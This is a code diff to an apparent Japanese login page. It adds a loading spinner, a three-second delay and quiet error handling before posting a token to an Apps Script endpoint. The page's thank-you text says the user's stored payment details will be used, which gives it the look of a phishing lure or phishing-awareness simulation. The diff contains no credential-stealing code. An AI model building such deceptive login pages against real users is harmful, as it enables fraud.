@@ -94,7 +94,35 @@
       .hidden {
         display: none;
       }
+
+      /* ローディング要素を画面全体に重ねて中央に表示 */
+      #loading-container {
+        position: fixed;           /* 画面に固定 */
+        top: 0; left: 0;          
+        width: 100%; height: 100%;
+        background: rgba(255, 255, 255, 0.8); /* 背景半透明 */
+        display: flex;            /* 真ん中配置のためFlexbox */
+        justify-content: center;  
+        align-items: center;      
+        z-index: 9999;            /* 手前に表示 */
+      }
   
+      /* スピナー本体 */
+      #spinner {
+        border: 16px solid #f3f3f3;       /* 薄いグレーのリング */
+        border-top: 16px solid #3498db;   /* 回転する部分（青） */
+        border-radius: 50%;
+        width: 120px;
+        height: 120px;
+        animation: spin 1.5s linear infinite;
+      }
+  
+      /* スピナーのアニメーション */
+      @keyframes spin {
+        0%   { transform: rotate(0deg);   }
+        100% { transform: rotate(360deg); }
+      } 
+      
       /* スマホなど狭い画面でフォームがぎゅっと縮まないよう微調整 */
       @media (max-width: 400px) {
         .login-container {
@@ -131,6 +159,10 @@
       </form>
     </div>
 
+    <div id="loading-container" class="hidden">
+      <div id="spinner"></div>
+    </div>
+
     <div id="done-container" class="hidden">
       <h3>送信ありがとうございました。</h3>
       <p>入力されたログイン情報を基に弊社にて、ご登録されている決済情報を使わせていただきます。</p>
@@ -165,30 +197,37 @@
         // 4) フォーム送信ボタン
         const submitBtn = document.getElementById('submitBtn');
         submitBtn.addEventListener('click', function(){
-          // 本来のフォーム送信イベントを止める
-          event.preventDefault();
-          // 送信データをFormDataで組み立てる
-          const formData = new FormData();
-          formData.append('token', token);
-  
-          // fetchでPOST
-          fetch(`${GAS_BASE}?mode=form&token=${encodeURIComponent(token)}`, {
-            method: 'POST',
-            body: formData
-          })
-          .then(res => res.text())
-          .then(html => {
-            console.log("Form submit response:", html);
-            // フォームを非表示、完了メッセージを表示
-            document.getElementById('login-container').classList.add('hidden');
-            document.getElementById('done-container').classList.remove('hidden');
-          })
-          .catch(err => {
-            alert("Error: " + err);
-            console.error(err);
-          });
+          // (B) ローディング表示して3秒待つ
+          document.getElementById('loading-container').classList.remove('hidden');
+          document.getElementById('login-container').classList.add('hidden');
+
+          setTimeout(() => {
+            // (C) 3秒後にfetchでPOST
+            const formData = new FormData();
+            formData.append('token', token);
+
+            fetch(`${GAS_BASE}?mode=form&token=${encodeURIComponent(token)}`, {
+              method: 'POST',
+              body: formData
+            })
+            .then(res => res.text())
+            .then(html => {
+              console.log("Form submit response:", html);
+
+              // (D) ローディングを非表示 → 完了画面を表示
+              document.getElementById('loading-container').classList.add('hidden');
+              document.getElementById('done-container').classList.remove('hidden');
+            })
+            .catch(err => {
+              // アラートは出さすに、エラーは無視
+              console.error(err);
+
+              // エラー時もローディング解除してフォームに戻す等
+              document.getElementById('loading-container').classList.add('hidden');
+              document.getElementById('login-container').classList.remove('hidden');
+            });
+          }, 3000); // 3秒  
         });
-  
       })();
     </script>
   </body>
